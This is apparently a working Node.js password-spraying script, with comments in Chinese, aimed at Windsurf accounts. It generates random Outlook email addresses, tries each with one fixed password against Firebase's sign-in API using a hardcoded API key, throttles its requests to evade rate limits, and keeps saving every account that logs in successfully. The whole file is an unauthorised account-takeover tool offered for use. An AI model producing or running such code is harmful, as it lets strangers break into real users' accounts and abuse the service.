#!/usr/bin/env node
// ============================================================
// Windsurf 账号无限测试脚本 (Node.js 版本)
// 直接在国外服务器运行，无需代理，无请求限制
// ============================================================

const https = require('https');
const fs = require('fs');
const path = require('path');

// ============================================================
// Firebase API 配置
// ============================================================
const FIREBASE_API_KEY = 'AIzaSyDsOl-1XpT5err0Tcnx8FFod1H8gVGIycY';
const SIGN_IN_URL = `/v1/accounts:signInWithPassword?key=${FIREBASE_API_KEY}`;
const DEFAULT_PASSWORD = 'Qwer123456++';

// ============================================================
// 输出文件
// ============================================================
const SUCCESS_JSON_FILE = path.join(__dirname, 'success_accounts.json');
const SUCCESS_TXT_FILE = path.join(__dirname, 'success_accounts.txt');

// ============================================================
// 名字库（用于随机生成邮箱）
// ============================================================
const FIRST_NAMES = [
    // 男性名字
    "James", "Michael", "William", "Benjamin", "Alexander", "Daniel", "Matthew", "Ethan",
    "Samuel", "Jackson", "Henry", "Sebastian", "Jack", "Aiden", "Owen", "David",
    "Joseph", "John", "Luke", "Noah", "Andrew", "Christopher", "Joshua", "Ryan",
    "Nathan", "Gabriel", "Dylan", "Logan", "Tyler", "Aaron", "Isaac", "Caleb",
    "Connor", "Elijah", "Lucas", "Adrian", "Robert", "Thomas", "Charles", "Eric",
    "Kevin", "Brandon", "Justin", "Austin", "Nicholas", "Patrick", "Steven", "Anthony",
    "Peter", "Timothy", "George", "Edward", "Jason", "Jeffrey", "Jacob", "Brian",
    "Liam", "Mason", "Oliver", "Leo", "Theodore", "Jasper", "Felix", "Oscar",
    "Hugo", "Arthur", "Max", "Finn", "Miles", "Jonah", "Ezra", "Silas",
    "Milo", "Axel", "Atlas", "Rowan", "Asher", "Declan", "Emmett", "Archer",
    "Brooks", "Bennett", "Spencer", "Griffin", "Harrison", "Preston", "Sawyer", "Cole",
    // 女性名字
    "Emma", "Sophia", "Olivia", "Isabella", "Charlotte", "Amelia", "Harper", "Avery",
    "Mila", "Evelyn", "Abigail", "Emily", "Elizabeth", "Sofia", "Ella", "Madison",
    "Scarlett", "Victoria", "Aria", "Grace", "Chloe", "Camila", "Penelope", "Riley",
    "Layla", "Lillian", "Nora", "Zoey", "Mia", "Hannah", "Lily", "Eleanor",
    "Hazel", "Violet", "Aurora", "Savannah", "Audrey", "Brooklyn", "Bella", "Claire",
    "Skylar", "Lucy", "Paisley", "Everly", "Anna", "Caroline", "Nova", "Genesis",
    "Emilia", "Kennedy", "Samantha", "Maya", "Willow", "Kinsley", "Naomi", "Aaliyah",
    "Elena", "Sarah", "Ariana", "Allison", "Gabriella", "Alice", "Madelyn", "Cora",
    "Ruby", "Eva", "Serenity", "Autumn", "Adeline", "Hailey", "Gianna", "Valentina",
    "Isla", "Eliana", "Quinn", "Nevaeh", "Ivy", "Sadie", "Piper", "Lydia"
];

const LAST_NAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
    "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas",
    "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson", "White",
    "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker", "Young",
    "Allen", "King", "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores",
    "Green", "Adams", "Nelson", "Baker", "Hall", "Rivera", "Campbell", "Mitchell",
    "Carter", "Roberts", "Gomez", "Phillips", "Evans", "Turner", "Diaz", "Parker",
    "Cruz", "Edwards", "Collins", "Reyes", "Stewart", "Morris", "Morales", "Murphy",
    "Cook", "Rogers", "Gutierrez", "Ortiz", "Morgan", "Cooper", "Peterson", "Bailey",
    "Reed", "Kelly", "Howard", "Ramos", "Kim", "Cox", "Ward", "Richardson",
    "Watson", "Brooks", "Chavez", "Wood", "James", "Bennett", "Gray", "Mendoza",
    "Wong", "Lee", "Chen", "Yang", "Wang", "Liu", "Lin", "Zhang",
    "Wu", "Huang", "Li", "Zhou", "Xu", "Sun", "Ma", "Zhu",
    "Park", "Choi", "Shin", "Cho", "Jung", "Kang", "Yoon", "Lim"
];

// ============================================================
// 并发配置（调整这个值来控制速率）
// ============================================================
const CONCURRENCY = 5;    // 极低并发，长期稳定运行
const REQUEST_DELAY = 500; // 每个请求之间延迟 500ms（约 2/秒/并发 = 10/秒总计）

// ============================================================
// 全局变量
// ============================================================
let successAccounts = [];
let existingEmails = new Set();
let testedCount = 0;
let successCount = 0;
let failedCount = 0;
let startTime = Date.now();
let activeRequests = 0;

// ============================================================
// 工具函数
// ============================================================

// 随机选择数组元素
function randomChoice(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

// 生成随机账号
function generateRandomAccount() {
    const firstName = randomChoice(FIRST_NAMES);
    const lastName = randomChoice(LAST_NAMES);
    const number = Math.floor(Math.random() * 9000) + 1000;
    const email = `${firstName}${lastName}${number}@outlook.com`;
    return { email, password: DEFAULT_PASSWORD };
}

// 加载已有成功账号
function loadExistingAccounts() {
    try {
        if (fs.existsSync(SUCCESS_JSON_FILE)) {
            const data = fs.readFileSync(SUCCESS_JSON_FILE, 'utf8');
            return JSON.parse(data);
        }
    } catch (e) {
        console.log(`[警告] 加载历史账号失败: ${e.message}`);
    }
    return [];
}

// 保存成功账号
function saveAccounts() {
    if (successAccounts.length === 0) return;
    
    // 保存 JSON
    fs.writeFileSync(SUCCESS_JSON_FILE, JSON.stringify(successAccounts, null, 2), 'utf8');
    
    // 保存 TXT
    const now = new Date().toISOString().replace('T', ' ').substring(0, 19);
    let txt = `# Windsurf 成功登录账号列表\n`;
    txt += `# 更新时间: ${now}\n`;
    txt += `# 成功账号数: ${successAccounts.length}\n\n`;
    successAccounts.forEach(acc => {
        txt += `${acc.email}\t${acc.password}\n`;
    });
    fs.writeFileSync(SUCCESS_TXT_FILE, txt, 'utf8');
}

// 测试单个账号登录
function testLogin(email, password) {
    return new Promise((resolve) => {
        const payload = JSON.stringify({
            returnSecureToken: true,
            email: email,
            password: password,
            clientType: 'CLIENT_TYPE_WEB'
        });
        
        const options = {
            hostname: 'identitytoolkit.googleapis.com',
            port: 443,
            path: SIGN_IN_URL,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(payload),
                'X-Client-Version': 'Chrome/JsCore/11.0.0/FirebaseCore-web'
            },
            timeout: 5000
        };
        
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const json = JSON.parse(data);
                    if (res.statusCode === 200) {
                        resolve({
                            success: true,
                            localId: json.localId,
                            email: email
                        });
                    } else {
                        const errorMsg = json.error?.message || '未知错误';
                        const errorMap = {
                            'TOO_MANY_ATTEMPTS_TRY_LATER': '请求过多，稍后重试',
                            'INVALID_LOGIN_CREDENTIALS': '邮箱或密码错误',
                            'EMAIL_NOT_FOUND': '邮箱未注册',
                            'USER_DISABLED': '账号已禁用'
                        };
                        resolve({
                            success: false,
                            error: errorMap[errorMsg] || errorMsg
                        });
                    }
                } catch (e) {
                    resolve({ success: false, error: '解析响应失败' });
                }
            });
        });
        
        req.on('error', (e) => {
            resolve({ success: false, error: `网络错误: ${e.message}` });
        });
        
        req.on('timeout', () => {
            req.destroy();
            resolve({ success: false, error: '请求超时' });
        });
        
        req.write(payload);
        req.end();
    });
}

// 格式化时间
function formatDuration(ms) {
    const seconds = Math.floor(ms / 1000);
    const minutes = Math.floor(seconds / 60);
    const hours = Math.floor(minutes / 60);
    if (hours > 0) return `${hours}小时${minutes % 60}分钟`;
    if (minutes > 0) return `${minutes}分钟${seconds % 60}秒`;
    return `${seconds}秒`;
}

// ============================================================
// 单个测试任务（并发执行）
// ============================================================
async function testTask() {
    while (true) {
        try {
            // 生成随机账号
            const account = generateRandomAccount();
            const { email, password } = account;
            
            // 跳过已测试成功的
            if (existingEmails.has(email)) continue;
            
            testedCount++;
            const currentCount = testedCount;
            
            activeRequests++;
            const result = await testLogin(email, password);
            activeRequests--;
            
            if (result.success) {
                console.log(`[#${currentCount}] ${email} -> ✅ 成功! ID: ${result.localId}`);
                successCount++;
                
                const newAccount = {
                    email: email,
                    password: password,
                    local_id: result.localId
                };
                successAccounts.push(newAccount);
                existingEmails.add(email);
                
                // 实时保存
                saveAccounts();
                console.log(`    [保存] 累计成功: ${successAccounts.length}`);
            } else {
                failedCount++;
                // 显示所有测试结果
                console.log(`[#${currentCount}] ${email} -> ❌ ${result.error}`);
                
                // 如果触发配额限制，暂停更长时间
                if (result.error && result.error.includes('QUOTA_EXCEEDED')) {
                    console.log(`[限流] 触发配额限制，暂停 30 秒...`);
                    await new Promise(r => setTimeout(r, 30000));
                }
            }
            
            // 请求间延迟
            await new Promise(r => setTimeout(r, REQUEST_DELAY));
            
        } catch (e) {
            console.log(`[错误] ${e.message}`);
            await new Promise(r => setTimeout(r, 1000));
        }
    }
}

// ============================================================
// 统计输出任务
// ============================================================
function startStatsReporter() {
    setInterval(() => {
        const elapsed = (Date.now() - startTime) / 1000;
        const rate = (testedCount / elapsed).toFixed(1);
        console.log(`[统计] 已测试: ${testedCount} | 成功: ${successCount} | 活跃: ${activeRequests} | 速率: ${rate}/秒`);
    }, 3000); // 每3秒输出一次统计
}

// ============================================================
// 日志清理任务（每分钟清理一次，保留最后 1000 行）
// ============================================================
const LOG_FILE = path.join(__dirname, 'output.log');
const MAX_LOG_LINES = 500;
const MAX_LOG_SIZE_MB = 5;  // 日志超过 5MB 自动清理

function startLogCleaner() {
    setInterval(() => {
        try {
            if (!fs.existsSync(LOG_FILE)) return;
            
            const stats = fs.statSync(LOG_FILE);
            const sizeMB = stats.size / (1024 * 1024);
            
            // 日志超过 5MB 时清理
            if (sizeMB > MAX_LOG_SIZE_MB) {
                const content = fs.readFileSync(LOG_FILE, 'utf8');
                const lines = content.split('\n');
                
                if (lines.length > MAX_LOG_LINES) {
                    // 保留最后 1000 行
                    const newContent = lines.slice(-MAX_LOG_LINES).join('\n');
                    fs.writeFileSync(LOG_FILE, newContent, 'utf8');
                    console.log(`[日志清理] 已清理日志，从 ${sizeMB.toFixed(1)}MB 压缩，保留最后 ${MAX_LOG_LINES} 行`);
                }
            }
        } catch (e) {
            // 忽略清理错误
        }
    }, 60000); // 每60秒检查一次
}

// ============================================================
// 主测试循环（并发版本）
// ============================================================
async function runTest() {
    console.log(`[配置] 并发数: ${CONCURRENCY}`);
    console.log('');
    
    // 启动统计输出
    startStatsReporter();
    
    // 启动日志清理（每分钟检查，超过10MB自动清理）
    startLogCleaner();
    
    // 启动多个并发任务
    const tasks = [];
    for (let i = 0; i < CONCURRENCY; i++) {
        tasks.push(testTask());
    }
    
    // 等待所有任务（永远不会结束）
    await Promise.all(tasks);
}

// ============================================================
// 主函数
// ============================================================
async function main() {
    console.log('============================================================');
    console.log('Windsurf 账号无限测试模式 (Node.js)');
    console.log(`启动时间: ${new Date().toISOString()}`);
    console.log(`名字库: ${FIRST_NAMES.length} 个名字 x ${LAST_NAMES.length} 个姓氏`);
    console.log(`可生成组合: 约 ${Math.floor(FIRST_NAMES.length * LAST_NAMES.length * 9000 / 1000000)} 百万种`);
    console.log('脚本将永久运行，请使用 Ctrl+C 或 kill 停止');
    console.log('============================================================');
    console.log('');
    
    // 加载历史账号
    successAccounts = loadExistingAccounts();
    existingEmails = new Set(successAccounts.map(a => a.email));
    console.log(`[初始化] 已加载 ${successAccounts.length} 个历史成功账号`);
    console.log('');
    
    // 开始测试
    await runTest();
}

// 优雅退出
process.on('SIGINT', () => {
    console.log('');
    console.log('============================================================');
    console.log('测试已停止');
    console.log('============================================================');
    console.log(`运行时长: ${formatDuration(Date.now() - startTime)}`);
    console.log(`本次测试: ${testedCount} 个`);
    console.log(`本次成功: ${successCount} 个`);
    console.log(`累计成功: ${successAccounts.length} 个`);
    console.log('');
    saveAccounts();
    console.log('✅ 所有成功账号已保存');
    process.exit(0);
});

// 启动
main().catch(console.error);
